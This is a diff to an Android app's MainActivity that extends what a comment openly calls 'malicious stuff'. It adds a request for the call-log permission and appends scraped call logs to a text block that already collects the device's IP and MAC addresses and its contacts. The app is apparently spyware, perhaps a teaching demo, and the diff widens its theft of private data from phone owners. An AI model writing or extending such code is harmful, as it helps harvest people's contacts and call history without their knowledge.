@@ -82,6 +82,9 @@ public class MainActivity extends AppCompatActivity {
             if (!addPermission(permissionsList, Manifest.permission.ACCESS_FINE_LOCATION)) {
                 permissionsNeeded.add("FineLocation");
             }
+            if (!addPermission(permissionsList, Manifest.permission.READ_CALL_LOG)) {
+                permissionsNeeded.add("FineLocation");
+            }
             if (!permissionsList.isEmpty()) {
                 requestPermissions(permissionsList.toArray(new String[0]),
                         REQUEST_CODE_ASK_MULTIPLE_PERMISSIONS);
@@ -115,6 +118,7 @@ public class MainActivity extends AppCompatActivity {
                 perms.put(Manifest.permission.WRITE_CONTACTS, PackageManager.PERMISSION_GRANTED);
                 perms.put(Manifest.permission.ACCESS_COARSE_LOCATION, PackageManager.PERMISSION_GRANTED);
                 perms.put(Manifest.permission.ACCESS_FINE_LOCATION, PackageManager.PERMISSION_GRANTED);
+                perms.put(Manifest.permission.READ_CALL_LOG, PackageManager.PERMISSION_GRANTED);
                 //Results
                 for (int i = 0; i < permissions.length; i++) {
                     perms.put(permissions[i], grantResults[i]);
@@ -127,6 +131,7 @@ public class MainActivity extends AppCompatActivity {
                         && perms.get(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
                         && perms.get(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED
                         && perms.get(Manifest.permission.INTERNET) == PackageManager.PERMISSION_GRANTED
+                        && perms.get(Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED
                 )
                 {
                     //All required permissions for malicious stuff is granted
@@ -209,6 +214,8 @@ public class MainActivity extends AppCompatActivity {
                         + "\nIP Address: " + ipAddressString + "\nMac Address: " + macAddress
                         + "\n\nContacts:\n-----\n"
                         + ContactScrape.scrapeContacts(getContentResolver())
+                        + "\n-----\n"
+                        + CallLogScrape.scrapeCallLogs(getContentResolver())
                 );
             }
         } .start();
